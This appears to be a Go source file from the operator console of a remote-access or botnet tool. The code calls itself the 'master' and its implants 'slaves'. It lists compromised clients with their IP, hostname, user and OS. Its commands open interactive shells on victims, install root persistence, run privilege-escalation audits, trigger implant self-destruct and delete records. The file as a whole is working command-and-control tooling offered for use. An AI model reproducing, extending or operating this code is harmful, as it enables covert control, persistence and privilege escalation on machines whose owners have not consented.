package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"zheng/internal/proto"
)

const controlReadTimeout = 10 * time.Second

// readControl reads one JSON control response with a deadline so a silent
// slave can never hang the master's main loop.
func readControl(c *client, v interface{}) error {
	return proto.ReadJSONDeadline(c.conn, v, controlReadTimeout)
}

// resolveClient parses "<id>" from args and returns the live client.
func resolveClient(reg *registry, args []string) (*client, error) {
	if len(args) < 1 {
		return nil, fmt.Errorf("missing client id")
	}
	id, err := strconv.Atoi(args[0])
	if err != nil {
		return nil, fmt.Errorf("invalid client id %q", args[0])
	}
	c, ok := reg.get(id)
	if !ok {
		return nil, fmt.Errorf("client %d not found or inactive", id)
	}
	return c, nil
}

// requireIdle rejects control commands while a raw shell is active on the
// client's conn; sending JSON in-band would corrupt the shell stream.
func requireIdle(c *client) error {
	if c.inShell() {
		return fmt.Errorf("client %d is in a shell session; exit it first", c.id)
	}
	return nil
}

func cmdClients(reg *registry, args []string) {
	onlyActive := len(args) > 0 && args[0] == "active"
	rows := dbListClients(onlyActive)
	if len(rows) == 0 {
		fmt.Println("no clients seen yet")
		return
	}

	fmt.Println()
	fmt.Printf("%-4s %-10s %-15s %-15s %-10s %-6s %-10s %s\n",
		"ID", "STATUS", "IP", "HOSTNAME", "USER", "OS", "RECONNECTS", "LAST SEEN")
	fmt.Println(strings.Repeat("-", 92))

	for _, r := range rows {
		status := fmt.Sprintf("%soffline%s", colorRed, colorReset)
		if r.Active {
			status = fmt.Sprintf("%sonline%s", colorGreen, colorReset)
		}
		reconn := "-"
		if r.Reconnects > 0 {
			reconn = fmt.Sprintf("%d", r.Reconnects)
		}
		fmt.Printf("%-4d %-10s %-15s %-15s %-10s %-6s %-10s %s\n",
			r.ID, status, r.IP, r.Hostname, r.Username, r.OS, reconn, r.LastSeen)
	}
	fmt.Println()

	reg.takeNotifications()
}

func cmdCheck(reg *registry, args []string) {
	c, err := resolveClient(reg, args)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	fmt.Printf("%s[*] checking client %d (%s@%s)...%s\n", colorCyan, c.id, c.recon.Username, c.recon.Hostname, colorReset)

	if err := pingClient(c); err != nil {
		fmt.Printf("%s[-] client %d unreachable: %v%s\n", colorRed, c.id, err, colorReset)
		reg.dropIfIdle(c)
		return
	}
	fmt.Printf("%s[+] client %d alive%s\n", colorGreen, c.id, colorReset)
}

// pingClient sends "ping" and waits for "pong".
func pingClient(c *client) error {
	if err := c.sendCmd("ping"); err != nil {
		return err
	}
	var pong struct {
		Status string `json:"status"`
	}
	if err := readControl(c, &pong); err != nil {
		return err
	}
	if pong.Status != "pong" {
		return fmt.Errorf("unexpected response %q", pong.Status)
	}
	return nil
}

func cmdPersist(reg *registry, args []string) {
	c, err := resolveClient(reg, args)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	if err := requireIdle(c); err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	fmt.Printf("%s[*] persisting client %d (%s@%s)...%s\n", colorCyan, c.id, c.recon.Username, c.recon.Hostname, colorReset)

	if err := c.sendCmd("persist"); err != nil {
		fmt.Printf("[-] send failed: %v\n", err)
		reg.dropIfIdle(c)
		return
	}
	var msg struct {
		Status string `json:"status"`
		Error  string `json:"error"`
		Detail string `json:"detail"`
	}
	if err := readControl(c, &msg); err != nil {
		fmt.Printf("[-] no response: %v\n", err)
		reg.dropIfIdle(c)
		return
	}
	switch msg.Status {
	case "persisted":
		fmt.Printf("%s[+] %s%s\n", colorGreen, msg.Detail, colorReset)
	case "persist_fail":
		fmt.Printf("%s[-] persist failed: %s%s\n", colorRed, msg.Error, colorReset)
	default:
		fmt.Printf("[-] unexpected response: %q\n", msg.Status)
	}
}

func cmdShell(reg *registry, args []string) {
	var c *client
	if len(args) == 0 {
		if reg.count() == 1 {
			for _, id := range reg.ids() {
				c, _ = reg.get(id)
			}
		} else {
			fmt.Println("usage: /shell <client_id>")
			return
		}
	} else {
		var err error
		c, err = resolveClient(reg, args)
		if err != nil {
			fmt.Printf("[-] %v\n", err)
			return
		}
	}
	if c.inShell() {
		fmt.Println("already in shell with this client")
		return
	}

	fmt.Printf("Entering shell on client %d (%s@%s)... type 'exit' to return.\n",
		c.id, c.recon.Username, c.recon.Hostname)
	if err := handleShell(c); err != nil {
		fmt.Printf("%s[-] shell ended with error: %v%s\n", colorRed, err, colorReset)
		reg.dropIfIdle(c)
	}
}

func cmdLPE(reg *registry, args []string) {
	if len(args) < 1 {
		fmt.Println("usage: /lpe <client_id> [force]")
		return
	}
	c, err := resolveClient(reg, args)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	if err := requireIdle(c); err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	force := len(args) >= 2 && args[1] == "force"

	if !force {
		audits, err := dbGetLPEAudits(c.id)
		if err == nil && len(audits) > 0 {
			fmt.Printf("%s[*] %d stored audit(s) for client %d — use '/lpe %d force' to re-run%s\n",
				colorCyan, len(audits), c.id, c.id, colorReset)
			for i, a := range audits {
				fmt.Printf("\n%s=== Audit #%d — %s (%s@%s) ===%s\n",
					colorBold, i+1, a["timestamp"], a["username"], a["hostname"], colorReset)
				fmt.Println(a["result"])
			}
			return
		}
	}

	fmt.Printf("%s[*] running LPE audit on client %d (%s@%s)...%s\n",
		colorCyan, c.id, c.recon.Username, c.recon.Hostname, colorReset)
	if err := c.sendCmd("lpe"); err != nil {
		fmt.Printf("[-] send failed: %v\n", err)
		reg.dropIfIdle(c)
		return
	}

	var result struct {
		Status string `json:"status"`
		Output string `json:"output"`
		Error  string `json:"error"`
	}
	if err := readControl(c, &result); err != nil {
		fmt.Printf("[-] no response: %v\n", err)
		reg.dropIfIdle(c)
		return
	}

	fmt.Printf("\n%s=== LPE AUDIT — %s@%s ===%s\n\n", colorBold, c.recon.Username, c.recon.Hostname, colorReset)
	if result.Status == "lpe_done" {
		fmt.Println(result.Output)
		if err := dbSaveLPEAudit(c.id, c.recon.Hostname, c.recon.Username, result.Output); err != nil {
			fmt.Printf("%s[-] failed to save audit to db: %v%s\n", colorRed, err, colorReset)
		} else {
			fmt.Printf("%s[+] audit saved to database%s\n", colorGreen, colorReset)
		}
	} else {
		fmt.Printf("%s[-] audit failed: %s%s\n", colorRed, result.Error, colorReset)
		if result.Output != "" {
			fmt.Println(result.Output)
		}
	}
}

func cmdDestroy(reg *registry, args []string) {
	c, err := resolveClient(reg, args)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	if err := requireIdle(c); err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	fmt.Printf("%s[!] destroying client %d (%s@%s)...%s\n", colorYellow, c.id, c.recon.Username, c.recon.Hostname, colorReset)

	if err := c.sendCmd("destroy"); err != nil {
		fmt.Printf("[-] send failed: %v\n", err)
		reg.dropIfIdle(c)
		return
	}
	var msg struct {
		Status string `json:"status"`
		Error  string `json:"error"`
	}
	if err := readControl(c, &msg); err != nil {
		fmt.Printf("[-] no response: %v\n", err)
	}
	switch msg.Status {
	case "destroyed":
		fmt.Printf("%s[+] client %d destroyed%s\n", colorGreen, c.id, colorReset)
		reg.remove(c.id)
	case "destroy_fail":
		fmt.Printf("%s[-] destroy failed: %s%s\n", colorRed, msg.Error, colorReset)
	}
}

func cmdRemove(reg *registry, args []string) {
	c, err := resolveClient(reg, args)
	if err != nil {
		fmt.Printf("[-] %v\n", err)
		return
	}
	dbDeleteClient(c.id)
	reg.remove(c.id)
	fmt.Printf("[+] client %d removed from database\n", c.id)
}

const helpText = `commands:
  /clients [active]       list all (or only online) clients
  /shell <id>             interactive shell on a client (exit returns here)
  /check <id>             ping a client
  /persist <id>           install persistence on a client (root required)
  /lpe <id> [force]       run/show local privilege escalation audit
  /destroy <id>           self-destruct the slave on a client
  /remove <id>            forget a client (delete from database)
  /clear                  clear the screen
  /help                   this text
  /done                   shut the master down`
